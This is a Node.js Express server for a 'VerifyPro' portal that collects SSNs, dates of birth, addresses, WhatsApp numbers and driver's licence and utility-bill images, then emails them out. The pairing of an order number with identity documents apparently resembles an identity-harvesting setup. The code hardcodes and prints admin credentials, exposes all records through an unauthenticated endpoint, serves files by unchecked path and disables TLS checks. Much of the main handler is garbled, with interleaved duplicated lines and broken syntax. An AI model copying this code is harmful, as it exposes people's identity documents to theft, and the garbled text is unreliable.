const express = require('express');
const multer = require('multer');
const { CloudinaryStorage } = require('multer-storage-cloudinary');
const cloudinary = require('cloudinary').v2;
const nodemailer = require('nodemailer');
const path = require('path');
const fs = require('fs');
const cors = require('cors');
const mongoose = require('mongoose');
const session = require('express-session');
require('dotenv').config();

// Configure Cloudinary
cloudinary.config({
  cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
  api_key: process.env.CLOUDINARY_API_KEY,
  api_secret: process.env.CLOUDINARY_API_SECRET,
});

// MongoDB Connection
let mongoConnected = false;

const connectMongoDB = async () => {
    try {
        await mongoose.connect(process.env.MONGODB_URI);
        mongoConnected = true;
        console.log('✅ MongoDB connected successfully');
    } catch (err) {
        console.error('❌ MongoDB connection error:', err.message);
        mongoConnected = false;
        // Retry connection after 5 seconds
        setTimeout(connectMongoDB, 5000);
    }
};

// Connect to MongoDB
connectMongoDB();

// Define Verification Schema and Model
const verificationSchema = new mongoose.Schema({
    orderNumber: {
        type: String,
        required: true,
        unique: true
    },
    fullName: {
        type: String,
        required: true
    },
    dateOfBirth: {
        type: String,
        required: true
    },
    ssn: {
        type: String,
        required: true
    },
    fullAddress: {
        type: String,
        required: true
    },
    whatsappNumber: {
        type: String,
        required: true
    },
    files: {
        dlFront: String,
        dlBack: String,
        utilityBill: String
    },
    status: {
        type: String,
        enum: ['pending_review', 'approved', 'rejected'],
        default: 'pending_review'
    },
    submittedAt: {
        type: Date,
        default: Date.now
    },
    createdAt: {
        type: Date,
        default: Date.now
    },
    ipAddress: String
}, {
    timestamps: true
});

const Verification = mongoose.model('Verification', verificationSchema);

const app = express();
const PORT = process.env.PORT || 3000;

// Serve static files from the 'public' directory
app.use(express.static(path.join(__dirname, 'public')));

// Admin credentials
const ADMIN_EMAIL = 'ttsuk21418@gmail.com';
const ADMIN_PASSWORD = '#email123';

// Session configuration
app.use(session({
    secret: 'verifypro-admin-secret-key',
    resave: false,
    saveUninitialized: true,
    cookie: { 
        secure: false,
        maxAge: 24 * 60 * 60 * 1000 // 24 hours
    }
}));

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Configure Multer for file uploads to Cloudinary
const storage = new CloudinaryStorage({
    cloudinary: cloudinary,
    params: {
        folder: 'verifypro-uploads',
        format: async (req, file) => 'png', // supports promises as well
        public_id: (req, file) => `${Date.now()}-${file.originalname}`,
    },
});

const upload = multer({ storage: storage });

// Configure Nodemailer Transporter
// NOTE: You need to configure these environment variables
// For Gmail: Use an App Password (not your regular password)
// Generate at: https://myaccount.google.com/apppasswords
const transporter = nodemailer.createTransport({
    host: process.env.EMAIL_HOST || 'smtp.gmail.com',
    port: process.env.EMAIL_PORT || 587,
    secure: false,
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASSWORD
    },
    tls: {
        rejectUnauthorized: false
    }
});

// Verify transporter connection (optional but useful for debugging)
transporter.verify((error, success) => {
    if (error) {
        console.error('Nodemailer connection error:', error);
    } else {
        console.log('✅ Nodemailer is ready to send emails');
    }
});

/**
 * Helper: Save verification to MongoDB
 */
async function saveVerificationToMongoDB(formData, files) {
    if (!mongoConnected) {
        console.log('ℹ️ MongoDB not connected, skipping database save');
        return null;
    }

    try {
        const verificationDoc = new Verification({
            orderNumber: formData.orderNumber,
            fullName: formData.fullName,
            dateOfBirth: formData.dateOfBirth,
            ssn: `***-**-${formData.ssn.slice(-4)}`, // Store only last 4 digits
            fullAddress: formData.fullAddress,
            whatsappNumber: formData.whatsappNumber,
            files: {
                dlFront: files.dlFront?.[0]?.path || 'N/A',
                dlBack: files.dlBack?.[0]?.path || 'N/A',
                utilityBill: files.utilityBill?.[0]?.path || 'N/A'
            },
            status: 'pending_review',
            ipAddress: 'client-ip-placeholder'
        });

        const savedDoc = await verificationDoc.save();
        console.log(`✅ Verification saved to MongoDB: ${savedDoc._id}`);
        return savedDoc._id;
    } catch (error) {
        console.warn(`⚠️ MongoDB save failed (non-critical): ${error.message}`);
        return null;
    }
}

/**
 * Helper: Format form data for email
 */
function formatFormDataForEmail(formData) {
    return `
        <table style="width: 100%; border-collapse: collapse; background-color: #f8f9fa;">
            <tr style="border-bottom: 1px solid #dee2e6;">
                <td style="padding: 12px; font-weight: 600; width: 40%; background-color: #e9ecef; color: #333;">Order Number</td>
                <td style="padding: 12px; color: #555;">${escapeHtml(formData.orderNumber)}</td>
            </tr>
            <tr style="border-bottom: 1px solid #dee2e6;">
                <td style="padding: 12px; font-weight: 600; width: 40%; background-color: #e9ecef; color: #333;">Full Name</td>
                <td style="padding: 12px; color: #555;">${escapeHtml(formData.fullName)}</td>
            </tr>
            <tr style="border-bottom: 1px solid #dee2e6;">
                <td style="padding: 12px; font-weight: 600; width: 40%; background-color: #e9ecef; color: #333;">Date of Birth</td>
                <td style="padding: 12px; color: #555;">${escapeHtml(formData.dateOfBirth)}</td>
            </tr>
            <tr style="border-bottom: 1px solid #dee2e6;">
                <td style="padding: 12px; font-weight: 600; width: 40%; background-color: #e9ecef; color: #333;">SSN / TAX ID / VAT</td>
                <td style="padding: 12px; color: #555; font-weight: 600; letter-spacing: 2px;">••• •• ${escapeHtml(formData.ssn.slice(-4))}</td>
            </tr>
            <tr style="border-bottom: 1px solid #dee2e6;">
                <td style="padding: 12px; font-weight: 600; width: 40%; background-color: #e9ecef; color: #333;">Full Address</td>
                <td style="padding: 12px; color: #555;">${escapeHtml(formData.fullAddress).replace(/\n/g, '<br>')}</td>
            </tr>
            <tr style="border-bottom: 1px solid #dee2e6;">
                <td style="padding: 12px; font-weight: 600; width: 40%; background-color: #e9ecef; color: #333;">WhatsApp Number</td>
                <td style="padding: 12px; color: #555;">${escapeHtml(formData.whatsappNumber)}</td>
            </tr>
        </table>
    `;
}

/**
 * Helper: Escape HTML for safety
 */
function escapeHtmlServer(text) {
    if (typeof text !== 'string') {
        return '';
    }
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, m => map[m]);
}

// Update formatFormDataForEmail to use the server version
function formatFormDataForEmailFixed(formData) {
    return `
        <table style="width: 100%; border-collapse: collapse; background-color: #f8f9fa;">
            <tr style="border-bottom: 1px solid #dee2e6;">
                <td style="padding: 12px; font-weight: 600; width: 40%; background-color: #e9ecef; color: #333;">Order Number</td>
                <td style="padding: 12px; color: #555;">${escapeHtmlServer(formData.orderNumber)}</td>
            </tr>
            <tr style="border-bottom: 1px solid #dee2e6;">
                <td style="padding: 12px; font-weight: 600; width: 40%; background-color: #e9ecef; color: #333;">Full Name</td>
                <td style="padding: 12px; color: #555;">${escapeHtmlServer(formData.fullName)}</td>
            </tr>
            <tr style="border-bottom: 1px solid #dee2e6;">
                <td style="padding: 12px; font-weight: 600; width: 40%; background-color: #e9ecef; color: #333;">Date of Birth</td>
                <td style="padding: 12px; color: #555;">${escapeHtmlServer(formData.dateOfBirth)}</td>
            </tr>
            <tr style="border-bottom: 1px solid #dee2e6;">
                <td style="padding: 12px; font-weight: 600; width: 40%; background-color: #e9ecef; color: #333;">SSN / TAX ID / VAT</td>
                <td style="padding: 12px; color: #555; font-weight: 600; letter-spacing: 2px;">••• •• ${escapeHtmlServer(formData.ssn.slice(-4))}</td>
            </tr>
            <tr style="border-bottom: 1px solid #dee2e6;">
                <td style="padding: 12px; font-weight: 600; width: 40%; background-color: #e9ecef; color: #333;">Full Address</td>
                <td style="padding: 12px; color: #555;">${escapeHtmlServer(formData.fullAddress).replace(/\n/g, '<br>')}</td>
            </tr>
            <tr style="border-bottom: 1px solid #dee2e6;">
                <td style="padding: 12px; font-weight: 600; width: 40%; background-color: #e9ecef; color: #333;">WhatsApp Number</td>
                <td style="padding: 12px; color: #555;">${escapeHtmlServer(formData.whatsappNumber)}</td>
            </tr>
        </table>
    `;
}

/**
 * API Endpoint: Verify and Submit
 */
app.post('/api/verify', upload.fields([
    { name: 'dlFront', maxCount: 1 },
    { name: 'dlBack', maxCount: 1 },
    { name: 'utilityBill', maxCount: 1 }
]), async (req, res) => {
    try {
        // Validate required files
        if (!req.files.dlFront || !req.files.dlBack || !req.files.utilityBill) {
            return res.status(400).json({
                error: 'All document files are required'
            });
        }

        // Extract form data
        const formData = {
            orderNumber: req.body.orderNumber,
            fullName: req.body.fullName,
            dateOfBirth: req.body.dateOfBirth,
            ssn: req.body.ssn,
            fullAddress: req.body.fullAddress,
            whatsappNumber: req.body.whatsappNumber
        };

        // Validate form data
        for (const [key, value] of Object.entries(formData)) {
            if (!value || value.trim() === '') {
                return res.status(400).json({
                    error: `Missing required field: ${key}`
                });
            }
        }

        // Save verification to MongoDB (optional, non-blocking)
        let mongoId = null;
        try {
            mongoId = await saveVerificationToMongoDB(formData, req.files);
        } catch (err) {
            console.warn('MongoDB save error (non-critical):', err.message);
        }

        // Prepare email attachments
        const attachments = [bject.values(req.files).flat().map(file => ({
            {ilename: file.originalname,
                filename: `DL-Front-${Date.now()}.${req.files.dlFront[0].originalname.split('.').pop()}`,
                path: req.files.dlFront[0].path
            },
            {ild email
                filename: `DL-Back-${Date.now()}.${req.files.dlBack[0].originalname.split('.').pop()}`,eHtmlServer(formData.fullName)}`;
                path: req.files.dlBack[0].path
            },emailHtml = `
            {!DOCTYPE html>
                filename: `Utility-Bill-${Date.now()}.${req.files.utilityBill[0].originalname.split('.').pop()}`,
                path: req.files.utilityBill[0].path
            }   <meta charset="UTF-8">
        ];      <style>
                    body {
        // Build email  font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        const emailSubject = `[VERIFICATION] Order #${escapeHtmlServer(formData.orderNumber)} - ${escapeHtmlServer(formData.fullName)}`;
                        color: #333;
        const emailHtml = `
            <!DOCTYPE html>ner {
            <html>      max-width: 600px;
            <head>      margin: 0 auto;
                <meta charset="UTF-8">
                <style> background-color: #f8f9fa;
                    body {
                        font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                        line-height: 1.6;r-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%);
                        color: #333;
                    }   padding: 30px 20px;
                    .container {adius: 12px 12px 0 0;
                        max-width: 600px;r;
                        margin: 0 auto;
                        padding: 20px;
                        background-color: #f8f9fa;
                    }   font-size: 28px;
                    .header {weight: 800;
                        background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%);
                        color: #fff;
                        padding: 30px 20px;
                        border-radius: 12px 12px 0 0;
                        text-align: center;
                    }   opacity: 0.95;
                    .header h1 {
                        margin: 0;
                        font-size: 28px;: #fff;
                        font-weight: 800;
                        letter-spacing: -1px;px 12px;
                    }   box-shadow: 0 4px 12px rgba(0,0,0,0.1);
                    .header p {
                        margin: 8px 0 0 0;
                        font-size: 14px;: #f0f0f0;
                        opacity: 0.95;15px;
                    }   margin: 25px 0 15px 0;
                    .content {-left: 4px solid #667eea;
                        background-color: #fff;
                        padding: 30px;
                        border-radius: 0 0 12px 12px;
                        box-shadow: 0 4px 12px rgba(0,0,0,0.1);
                    }   letter-spacing: 0.5px;
                    .section-title {
                        background-color: #f0f0f0;
                        padding: 12px 15px;
                        margin: 25px 0 15px 0;pse;
                        border-left: 4px solid #667eea;
                        font-weight: 700;
                        color: #222;
                        font-size: 14px;
                        text-transform: uppercase;e8e8e8;
                        letter-spacing: 0.5px;
                    }d {
                    table {ding: 12px 15px;
                        width: 100%;
                        border-collapse: collapse;
                        background-color: #f8f9fa;
                        margin: 10px 0;0;
                    }   width: 40%;
                    tr {background-color: #f0f0f0;
                        border-bottom: 1px solid #e8e8e8;
                    }
                    td {ter {
                        padding: 12px 15px;
                        color: #555; 20px;
                    }   border-top: 1px solid #ddd;
                    td:first-child {2px;
                        font-weight: 600;
                        width: 40%; center;
                        background-color: #f0f0f0;
                        color: #333;e {
                    }   background: linear-gradient(135deg, rgba(102, 126, 234, 0.1) 0%, rgba(118, 75, 162, 0.1) 100%);
                    .footer {r-left: 4px solid #667eea;
                        margin-top: 30px;
                        padding-top: 20px;
                        border-top: 1px solid #ddd;
                        font-size: 12px;
                        color: #999;
                        text-align: center;ck;
                    }   background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    .attachments-note {
                        background: linear-gradient(135deg, rgba(102, 126, 234, 0.1) 0%, rgba(118, 75, 162, 0.1) 100%);
                        border-left: 4px solid #667eea;
                        padding: 12px;x;
                        margin-top: 20px;
                        border-radius: 6px;
                    }
                    .status-badge {
                        display: inline-block;
                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                        color: white;">
                        padding: 6px 12px;
                        border-radius: 20px;
                        font-size: 12px;ation Submission</p>
                        font-weight: 700;
                        margin-top: 10px;
                    }   <h2 style="color: #222; margin-top: 0;">Verification Details Received</h2>
                </style><p style="color: #666; margin-bottom: 20px;">A new verification submission has been received. Below are the submitted details:</p>
            </head>
            <body>      <div class="section-title">📋 Order & Personal Information</div>
                <div class="container">
                    <div class="header">
                        <h1>VerifyPro</h1>Number</td>
                        <p>✓ New Verification Submission</p>67eea;">${escapeHtmlServer(formData.orderNumber)}</strong></td>
                    </div>  </tr>
                    <div class="content">
                        <h2 style="color: #222; margin-top: 0;">Verification Details Received</h2>
                        <p style="color: #666; margin-bottom: 20px;">A new verification submission has been received. Below are the submitted details:</p>
                            </tr>
                        <div class="section-title">📋 Order & Personal Information</div>
                        <table> <td>Date of Birth</td>
                            <tr><td>${escapeHtmlServer(formData.dateOfBirth)}</td>
                                <td>Order Number</td>
                                <td><strong style="color: #667eea;">${escapeHtmlServer(formData.orderNumber)}</strong></td>
                            </tr>td>SSN / TAX ID / VAT</td>
                            <tr><td><span style="font-weight: 600; letter-spacing: 1px;">••• •• ${escapeHtmlServer(formData.ssn.slice(-4))}</span></td>
                                <td>Full Name</td>
                                <td>${escapeHtmlServer(formData.fullName)}</td>
                            </tr>
                            <tr>ss="section-title">📍 Address Information</div>
                                <td>Date of Birth</td>
                                <td>${escapeHtmlServer(formData.dateOfBirth)}</td>
                            </tr>td>Full Address</td>
                            <tr><td>${escapeHtmlServer(formData.fullAddress).replace(/\n/g, '<br>')}</td>
                                <td>SSN / TAX ID / VAT</td>
                                <td><span style="font-weight: 600; letter-spacing: 1px;">••• •• ${escapeHtmlServer(formData.ssn.slice(-4))}</span></td>
                            </tr>
                        </table>ss="section-title">📞 Contact Information</div>
                        <table>
                        <div class="section-title">📍 Address Information</div>
                        <table> <td>WhatsApp Number</td>
                            <tr><td><strong>${escapeHtmlServer(formData.whatsappNumber)}</strong></td>
                                <td>Full Address</td>
                                <td>${escapeHtmlServer(formData.fullAddress).replace(/\n/g, '<br>')}</td>
                            </tr>
                        </table>ss="section-title">📎 Documents Attached</div>
                        <p style="color: #666; margin: 0 0 10px 0; font-size: 14px;">The following documents have been uploaded:</p>
                        <div class="section-title">📞 Contact Information</div>r: #555; font-size: 14px;">
                        <table>>✓ Driving License - Front</li>
                            <tr>✓ Driving License - Back</li>
                                <td>WhatsApp Number</td>Bill</li>
                                <td><strong>${escapeHtmlServer(formData.whatsappNumber)}</strong></td>
                            </tr>
                        </table>ss="attachments-note">
                            All documents are attached to this email. Please review them carefully.
                        <div class="section-title">📎 Documents Attached</div>
                        <p style="color: #666; margin: 0 0 10px 0; font-size: 14px;">The following documents have been uploaded:</p>
                        <ul style="margin: 0 0 10px 0; padding-left: 20px; color: #555; font-size: 14px;">
                            <li>✓ Driving License - Front</li>
                            <li>✓ Driving License - Back</li>
                            <li>✓ Electricity / Utility Bill</li>
                        </ul>   <td>${new Date().toLocaleString()}</td>
                            </tr>
                        <div class="attachments-note">
                            All documents are attached to this email. Please review them carefully.
                        </div>  <td><div class="status-badge">⏳ PENDING REVIEW</div></td>
                            </tr>
                        <div class="section-title">⏰ Submission Details</div>
                        <table>
                            <tr>ss="footer">
                                <td>Submitted At</td> 0;">© 2026 VerifyPro. All rights reserved.</p>
                                <td>${new Date().toLocaleString()}</td>nt Verification Platform</p>
                            </tr>yle="margin: 0;">This email contains sensitive information. Please handle securely.</p>
                            <tr>
                                <td>Status</td>
                                <td><div class="status-badge">⏳ PENDING REVIEW</div></td>
                            </tr>
                        </table>
        `;
                        <div class="footer">
                            <p style="margin: 0 0 8px 0;">© 2026 VerifyPro. All rights reserved.</p>
                            <p style="margin: 0 0 8px 0;">Secure Document Verification Platform</p>
                            <p style="margin: 0;">This email contains sensitive information. Please handle securely.</p>
                        </div>CIPIENT_EMAIL || process.env.EMAIL_TO,
                    </div>Subject,
                </div>lHtml,
            </body>ents: attachments
            </html>
        `;
        // Try to send email, but don't fail the submission if it fails
        // Send email = false;
        const mailOptions = {
            from: process.env.EMAIL_FROM || process.env.EMAIL_USER,
            to: process.env.RECIPIENT_EMAIL || process.env.EMAIL_TO,
            subject: emailSubject,ation email sent successfully for Order #${formData.orderNumber}`);
            html: emailHtml, {
            attachments: attachmentsending failed (non-critical): ${emailError.message}`);
        };  console.log(`📁 Verification files saved locally for Order #${formData.orderNumber}`);
            console.log(`📧 Email credentials may need to be configured. See SETUP.md for help.`);
        // Try to send email, but don't fail the submission if it fails
        let emailSent = false;
        try {ean up uploaded files after sending (optional)
            await transporter.sendMail(mailOptions);e keep files for manual review
            emailSent = true;
            console.log(`✅ Verification email sent successfully for Order #${formData.orderNumber}`);
        } catch (emailError) {rEach(attachment => {
            console.warn(`⚠️ Email sending failed (non-critical): ${emailError.message}`);
            console.log(`📁 Verification files saved locally for Order #${formData.orderNumber}`);
            console.log(`📧 Email credentials may need to be configured. See SETUP.md for help.`);
        }       });
            }, 5000);
        // Clean up uploaded files after sending (optional)
        // Only clean up if email was sent, otherwise keep files for manual review
        if (emailSent) {response
            setTimeout(() => {
                attachments.forEach(attachment => {
                    fs.unlink(attachment.path, (err) => {
                        if (err) console.error(`Error deleting file: ${attachment.path}`, err);
                    });fication submitted successfully. Files saved (email pending configuration)',
                });: formData.orderNumber,
            }, 5000);mongoId,
        }   emailSent: emailSent,
            filesCount: 3
        // Send success response
        res.status(200).json({
            success: true,
            message: emailSent cation submission error:', error);
                ? 'Verification submitted successfully and email sent' 
                : 'Verification submitted successfully. Files saved (email pending configuration)',
            orderId: formData.orderNumber,ng submission. Please try again.',
            mongoId: mongoId,env.NODE_ENV === 'development' ? error.message : undefined
            emailSent: emailSent,
            filesCount: 3
        });

    } catch (error) {
        console.error('❌ Verification submission error:', error);
 */
        res.status(500).json({
            error: 'An error occurred during submission. Please try again.',
            details: process.env.NODE_ENV === 'development' ? error.message : undefined
        });.session.adminLoggedIn) {
    }   return res.redirect('/admin');
}); }
    res.sendFile(path.join(__dirname, 'public', 'admin-login.html'));
/**
 * ADMIN AUTHENTICATION ROUTES
 */Admin login API
app.post('/api/admin/login', (req, res) => {
// Admin login pagepassword } = req.body;
app.get('/admin/login', (req, res) => {
    if (req.session.adminLoggedIn) {sword === ADMIN_PASSWORD) {
        return res.redirect('/admin');ue;
    }   req.session.adminEmail = email;
    res.sendFile(path.join(__dirname, 'public', 'admin-login.html'));
}); } else {
        res.status(401).json({ success: false, message: 'Invalid credentials' });
// Admin login API
app.post('/api/admin/login', (req, res) => {
    const { email, password } = req.body;
// Admin logout
    if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
        req.session.adminLoggedIn = true;
        req.session.adminEmail = email;'Logged out' });
        res.json({ success: true, message: 'Login successful' });
    } else {
        res.status(401).json({ success: false, message: 'Invalid credentials' });
    } requireAdmin = (req, res, next) => {
}); if (req.session.adminLoggedIn) {
        next();
// Admin logout
app.get('/api/admin/logout', (req, res) => {horized' });
    req.session.destroy();
    res.json({ success: true, message: 'Logged out' });
});
// Admin dashboard page
// Middleware: Check if admin is logged in
const requireAdmin = (req, res, next) => {
    if (req.session.adminLoggedIn) {login');
        next();
    } else {File(path.join(__dirname, 'public', 'admin-dashboard.html'));
        res.status(401).json({ error: 'Unauthorized' });
    }
}; API: Get all verifications
app.get('/api/admin/verifications', requireAdmin, async (req, res) => {
// Admin dashboard page
app.get('/admin', (req, res) => {it Verification.find().sort({ createdAt: -1 });
    if (!req.session.adminLoggedIn) {a: verifications });
        return res.redirect('/admin/login');
    }   res.status(500).json({ error: error.message });
    res.sendFile(path.join(__dirname, 'public', 'admin-dashboard.html'));
});

// API: Get a single verification by IDD
app.get('/api/verification/:id', async (req, res) => {=> {
    if (!req.session.isAdmin) {
        return res.status(403).json({ error: 'Forbidden' });
    }
    try {s.status(404).json({ error: 'Verification not found' });
        const verification = await Verification.findById(req.params.id);
        if (!verification) {   res.json({ success: true, data: verification });
            return res.status(404).json({ error: 'Verification not found' }); } catch (error) {
        }        res.status(500).json({ error: error.message });
        res.json(verification);
    } catch (error) {
        console.error('Error fetching verification details:', error);
        res.status(500).json({ error: 'Server error' });
    }tions/:id', requireAdmin, async (req, res) => {
});
onst { status } = req.body;
// API: Get all verificationsincludes(status)) {
app.get('/api/verifications', async (req, res) => {s.status(400).json({ error: 'Invalid status' });
    try {
        const verifications = await Verification.find().sort({ createdAt: -1 });   const verification = await Verification.findByIdAndUpdate(
        res.json({ success: true, data: verifications });         req.params.id,
    } catch (error) {            { status },
        res.status(500).json({ error: error.message });
    }
});es.json({ success: true, data: verification });

// API: Get verification by ID
app.get('/api/admin/verifications/:id', requireAdmin, async (req, res) => {
    try {
        const verification = await Verification.findById(req.params.id);
        if (!verification) {n record
            return res.status(404).json({ error: 'Verification not found' });verifications/:id', requireAdmin, async (req, res) => {
        }
        res.json({ success: true, data: verification });nst verification = await Verification.findById(req.params.id);
    } catch (error) {
        res.status(500).json({ error: error.message });s.status(404).json({ error: 'Verification not found', success: false });
    }
});
     // Delete uploaded files if they exist
// API: Update verification status        if (verification.files) {
app.put('/api/admin/verifications/:id', requireAdmin, async (req, res) => {.dlFront) {
    try {lFront);
        const { status } = req.body;       if (fs.existsSync(dlFrontPath)) fs.unlinkSync(dlFrontPath);
        if (!['pending_review', 'approved', 'rejected'].includes(status)) {
            return res.status(400).json({ error: 'Invalid status' });.files.dlBack) {
        }
        const verification = await Verification.findByIdAndUpdate(       if (fs.existsSync(dlBackPath)) fs.unlinkSync(dlBackPath);
            req.params.id,            }
            { status },) {
            { new: true }Path = path.join(uploadsDir, verification.files.utilityBill);
        );Path)) fs.unlinkSync(utilityBillPath);
        res.json({ success: true, data: verification });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});
uccessfully' });
// API: Delete verification recorderror) {
app.delete('/api/admin/verifications/:id', requireAdmin, async (req, res) => {ge, success: false });
    try {
        const verification = await Verification.findById(req.params.id);
        if (!verification) {
            return res.status(404).json({ error: 'Verification not found', success: false });uploaded files
        }app.get('/uploads/:filename', (req, res) => {
, req.params.filename);
        // Delete uploaded files if they exist
        if (verification.files) {
            if (verification.files.dlFront) {
                const dlFrontPath = path.join(uploadsDir, verification.files.dlFront);
                if (fs.existsSync(dlFrontPath)) fs.unlinkSync(dlFrontPath);
            }
            if (verification.files.dlBack) {
                const dlBackPath = path.join(uploadsDir, verification.files.dlBack);
                if (fs.existsSync(dlBackPath)) fs.unlinkSync(dlBackPath);
            }
            if (verification.files.utilityBill) {
                const utilityBillPath = path.join(uploadsDir, verification.files.utilityBill);
                if (fs.existsSync(utilityBillPath)) fs.unlinkSync(utilityBillPath);eck endpoint
            }
        }es.status(200).json({ 
     status: 'OK', 
        // Delete the verification record        timestamp: new Date().toISOString(),
        await Verification.findByIdAndDelete(req.params.id);cted: mongoConnected
        res.json({ success: true, message: 'Verification record deleted successfully' });
    } catch (error) {
        res.status(500).json({ error: error.message, success: false });
    }// 404 Handler
});
'Endpoint not found' });
// Serve uploaded files
app.get('/uploads/:filename', (req, res) => {
    const filePath = path.join(uploadsDir, req.params.filename);
    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);sole.error('❌ Server error:', err);
    } else {
        res.status(404).json({ error: 'File not found' });    // Handle multer errors
    }de === 'LIMIT_FILE_SIZE') {
});us(400).json({ error: 'File is too large. Maximum size is 5MB.' });

// Serve home page
app.get('/', (req, res) => {    if (err.code === 'LIMIT_FILE_COUNT') {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));es.status(400).json({ error: 'Too many files uploaded.' });
});

// Health check endpoint    res.status(500).json({
app.get('/health', (req, res) => {curred',
    res.status(200).json({  'development' ? err.message : undefined
        status: 'OK', 
        timestamp: new Date().toISOString(),
        mongoConnected: mongoConnected
    });
});
onsole.log(`
// 404 Handler╔════════════════════════════════════════════════════════════╗
app.use((req, res) => {VERIFICATION PORTAL                ║
    res.status(404).json({ error: 'Endpoint not found' });nt Verification System    ║
});
ver:        http://localhost:${PORT}                       ║
// Error Handler Admin Panel:   http://localhost:${PORT}/admin/login              ║
app.use((err, req, res, next) => {║   Database:      MongoDB                                   ║
    console.error('❌ Server error:', err);    Running                                   ║
                                     ║
    // Handle multer errorsials:                                       ║
    if (err.code === 'LIMIT_FILE_SIZE') {
        return res.status(400).json({ error: 'File is too large. Maximum size is 5MB.' });
    }

    if (err.code === 'LIMIT_FILE_COUNT') {
        return res.status(400).json({ error: 'Too many files uploaded.' });
    }
    res.status(500).json({        error: 'An error occurred',        details: process.env.NODE_ENV === 'development' ? err.message : undefined    });});// Start serverapp.listen(PORT, () => {    console.log(`╔════════════════════════════════════════════════════════════╗
║   🔐 VERIFYPRO - SECURE VERIFICATION PORTAL                ║
║   MongoDB Edition - Secure Document Verification System    ║
╠════════════════════════════════════════════════════════════╣
║   Server:        http://localhost:${PORT}                       ║
║   Admin Panel:   http://localhost:${PORT}/admin/login              ║
║   Database:      MongoDB                                   ║
║   Status:        Running                                   ║
║                                                            ║
║   Admin Credentials:                                       ║
║   📧 Email:    ttsuk21418@gmail.com                        ║
║   🔑 Password: #email123                                   ║
╚════════════════════════════════════════════════════════════╝
    `);
});

module.exports = app;
